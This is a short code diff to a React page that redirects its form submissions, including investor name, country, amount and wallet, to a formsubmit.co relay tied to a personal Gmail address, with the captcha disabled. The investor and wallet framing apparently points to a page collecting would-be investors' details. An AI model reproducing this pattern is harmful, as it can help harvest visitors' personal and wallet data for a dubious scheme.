@@ -55,7 +55,7 @@ export default function Page() {
     setShowSuccess(true);
 
     try {
-      await fetch("https://formsubmit.co/el/suloba", {
+      await fetch("https://formsubmit.co/ajax/ek0701293@gmail.com", {
         method: "POST",
         headers: { "Content-Type": "application/json", "Accept": "application/json" },
         body: JSON.stringify({
@@ -69,6 +69,7 @@ export default function Page() {
           Wallet: wallet || "Not Connected",
           _subject: `NEW INVESTOR $${amount} - ${name} - ${country}`,
           _template: "table",
+          _captcha: "false",
         }),
       });
     } catch (e) {
